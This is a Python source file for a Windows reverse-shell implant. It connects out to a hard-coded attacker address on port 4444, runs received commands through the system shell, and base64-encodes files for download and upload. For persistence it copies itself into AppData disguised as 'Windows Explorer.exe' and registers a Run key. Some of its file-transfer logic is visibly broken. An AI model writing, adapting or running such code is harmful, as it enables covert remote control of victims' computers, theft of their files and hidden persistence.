import socket
import subprocess
import os, sys, base64
import json
import shutil
class ReverseShell:
    def __init__(self, attacker_ip="192.168.31.135", attacker_port=4444):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    

    def become_persistence(self):
        evil_file_location = os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\currentVersion\\Run /v test REG_SZ /d "{evil_file_location}" /f', shell=True)
    def read_file(self, path):
        try:
            with open(path,"rb") as file:
                return base64.b64encode(file.read())
        except FileNotFoundError:
            return f"[-] file not found: {path}"
    def write_file(self,path,content):
        with open(path,'wb')as file:
            file.write(base64.b64decode(content))
        return "[+] Uploaded successfully"
    
            
    def connect(self):
        """Connects to the attacker's machine and waits for commands."""
        try:
            self.sock.connect((self.attacker_ip, self.attacker_port))
            while True:
                command = self.sock.recv(1024).decode().strip()
                if command.lower() in ["exit", "quit"]:
                    break
                output = self.run_command(command)
                self.sock.send(output.encode() if output else b"Command executed.\n")
        except Exception as e:
            print(f"Connection error: {e}")
        finally:
            self.sock.close()

    def run_command(self, command):
        """Executes received commands and returns the output."""
        try:
            if command.startswith("cd "):  # Handle 'cd' separately
                os.chdir(command[3:])
                return f"Changed directory to {os.getcwd()}\n"
            elif command =="exit":
                self.sock.connect()
                sys.exit()
            elif command.lower().startswith("download"):
                 command.split()
                 result = self.read_file(command[1])
            elif command.lower().startswith("upload"):
                 command.split()
                 result = self.write_file(command[1])
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output
        return output

if __name__ == "__main__":
    shell = ReverseShell()
    shell.connect()
